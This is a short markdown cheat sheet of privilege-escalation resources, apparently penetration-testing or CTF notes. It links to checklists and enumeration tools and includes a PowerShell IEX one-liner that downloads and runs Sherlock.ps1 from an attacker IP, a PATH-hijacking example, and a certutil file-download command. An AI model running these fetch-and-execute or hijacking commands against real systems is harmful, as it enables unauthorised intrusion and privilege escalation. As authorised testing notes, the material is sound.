# priv-esc

|Checklists|
|-|
|[g0tmi1k Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)|
|[hacktricks Linux Privilege Escalation](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) |
|[fuzzysecurity Windows Privilege Escalation ](https://www.fuzzysecurity.com/tutorials/16.html) |
|[PowerSploit - PowerUp](https://github.com/PowerShellMafia/PowerSploit)
|[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)|



|Scripts| |
|-|-|
| [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)|
| [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)|
| [linenum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) |
| MSF - local_exploit_suggester |
| [AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) |
| [jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)
| [RastaMouse/Sherlock](https://github.com/rasta-mouse/Sherlock) | `powershell "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.24:8888/Sherlock.ps1');$a=find-allvulns;$a | where-object {$_.VulnStatus -notlike 'not *'}| ft Title,VulnStatus,MSBulletin,CVEID,Link -autosize"` | 

## Path vulnerability

If something searches the Path for a a command and where able to replace the path we can trick the system to execute something else.  
Whenever we use `ls` it will now actually run `cat`.

```bash
export PATH="/tmp/tmp:${PATH}"
cp /bin/cat /tmp/tmp/cat
mv /tmp/tmp/cat /tmp/tmp/ls
```

## [GTFOBins](https://gtfobins.github.io/)

## Download files in command prompt

```
certutil.exe -urlcache -split -f "https://url/file" file
```
